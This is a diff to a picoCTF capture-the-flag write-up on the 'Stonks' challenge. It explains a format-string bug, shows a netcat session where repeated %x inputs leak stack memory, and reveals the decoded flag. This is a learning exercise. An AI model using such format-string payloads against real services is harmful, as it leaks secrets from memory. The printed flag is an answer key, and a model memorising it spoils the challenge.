@@ -205,6 +205,37 @@ int main(int argc, char *argv[])
 ```
 In the function buy_stonkso we see that is reading the flag(api) from the file 'api' and storing it in the stack 'api_buf'. It then aks the user to input 
 their api token which is stored in the stack 'user_buf' and then prints it. After doing some reading I found out that this is a type of string format 
-vulnerability. We can exploit this by inputting %x repeatedly to read the api from the stack.
+vulnerability. We can exploit this by inputting %x repeatedly to read the api from the stack to extract the hexadecimal values.
+```t
+aarav@aarav-Inspiron-3584:~$ nc mercury.picoctf.net 33411
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+1
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x 
+Buying stonks with token:
+989e450804b00080489c3f7f75d80ffffffff1989c160f7f83110f7f75dc70989d1801989e430989e4506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffe1007d
+Portfolio as of Sun Feb 19 07:44:51 UTC 2023
+
+
+1 shares of THT
+1 shares of W
+7 shares of QTDX
+11 shares of JUN
+4 shares of BQB
+60 shares of H
+14 shares of SR
+95 shares of VRI
+152 shares of Y
+150 shares of SF
+1478 shares of KIR
+Goodbye!
+```
+Converting this hexadecimal to ASCII we get text that vaguely resembles the flag. I realised that the bytes are not in the right order as we extracted them from a stack in the top down uproach. After rearranging them in the right order the obtained flag was picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
 
 
